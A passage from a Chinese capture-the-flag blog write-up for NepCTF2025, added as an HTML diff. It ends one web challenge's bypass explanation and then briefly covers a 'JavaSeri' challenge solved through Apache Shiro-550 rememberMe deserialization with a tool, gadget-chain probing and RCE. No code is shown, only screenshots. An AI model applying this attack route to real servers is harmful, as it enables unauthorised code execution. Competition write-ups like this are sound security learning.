+<p>为什么这里可以呢，其实也很简单，因为这里并不符合内层的两个if语句，既不是String对象的方法，也不是execute方法，所以也就不会触发异常抛出，同样可以返回true</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250726032302337.png" alt="image-20250726032302337"></p>
+<h2 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a>JavaSeri</h2><h3 id="shiro550"><a href="#shiro550" class="headerlink" title="#shiro550"></a>#shiro550</h3><p>感觉被资本做局了，从题目上线到比赛结束，我每次打开环境都是跳转127.0.0.1，不知道为啥，赛后拿朋友开的环境直接就打开了。。。</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250729105943641.png" alt="image-20250729105943641"></p>
+<p>看到一个shiro和remember me，直接猜测是shiro550反序列化，拿工具一把梭吧</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250729110039455.png" alt="image-20250729110039455"></p>
+<p>然后探测利用链并RCE就行了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyGooGooVVVY"><span class="toc-number">2.</span> <span class="toc-text">easyGooGooVVVY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-bank"><span class="toc-number">3.</span> <span class="toc-text">safe_bank</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">#jsonpickle反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RevengeGooGooVVVY"><span class="toc-number">4.</span> <span class="toc-text">RevengeGooGooVVVY</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">方法一:属性访问表达式绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-getClass-%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">方法二:getClass()方法绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaSeri"><span class="toc-number">5.</span> <span class="toc-text">JavaSeri</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro550"><span class="toc-number">5.1.</span> <span class="toc-text">#shiro550</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/07/25/NepCTF2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/07/25/NepCTF2025/&text=NepCTF2025"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/07/25/NepCTF2025/&is_video=false&description=NepCTF2025"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NepCTF2025&body=Check out this article: http://example.com/2025/07/25/NepCTF2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/07/25/NepCTF2025/&name=NepCTF2025&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/07/25/NepCTF2025/&t=NepCTF2025"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
